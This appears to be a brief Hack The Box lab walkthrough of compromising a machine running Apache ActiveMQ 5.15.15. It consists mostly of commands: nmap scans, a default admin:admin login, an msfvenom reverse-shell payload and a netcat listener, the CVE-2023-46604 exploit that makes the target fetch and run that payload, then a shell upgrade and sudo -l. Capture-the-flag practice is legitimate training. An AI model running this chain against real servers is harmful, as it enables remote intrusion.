```
nmap -sS -sC -sV -T5 -Pn 10.10.11.243
nmap -p- -T5 10.10.11.243
```
![image](https://github.com/regarmulia/HTB/assets/33616880/1186881c-78c2-46f8-a554-1ba8d6634117)

![image](https://github.com/regarmulia/HTB/assets/33616880/2611c10e-95d7-41e1-8c74-6fcf7f6f8844)

```
10.10.11.243/
admin:admin
```
![image](https://github.com/regarmulia/HTB/assets/33616880/4bb5ac1e-d62a-46cd-822f-3ac7bee4abc8)

![image](https://github.com/regarmulia/HTB/assets/33616880/cc45491e-7042-4a98-8622-5722631b40a6)

![image](https://github.com/regarmulia/HTB/assets/33616880/67f7a55f-3471-4f52-a062-46c83d247792)

```
activemq broker 5.15.15 exploit
```
![image](https://github.com/regarmulia/HTB/assets/33616880/0c0635b0-741d-46c7-ad00-e4a8c7a45c99)

![image](https://github.com/regarmulia/HTB/assets/33616880/bb33149d-66eb-4c81-904e-8c31d3b0be2c)


```
git clone https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ.git
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.12 LPORT=4444 -f elf -o test.elf
python3 -m http.server 8001
nc -lvvp 4444
go run main.go -i 10.10.11.243 -p 61616 -u http://10.10.14.12:8001/poc-linux.xml
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
![image](https://github.com/regarmulia/HTB/assets/33616880/02a6e7d6-a3cd-486c-9719-80fa5efa2b77)

![image](https://github.com/regarmulia/HTB/assets/33616880/497cfa98-5b46-4748-bb90-3504ed9869d3)

![image](https://github.com/regarmulia/HTB/assets/33616880/b1fd204c-a6df-4c0c-af35-e24df116c0c3)


```
sudo -l
```
![image](https://github.com/regarmulia/HTB/assets/33616880/b859f21c-8787-40ff-af31-430a25fb5886)
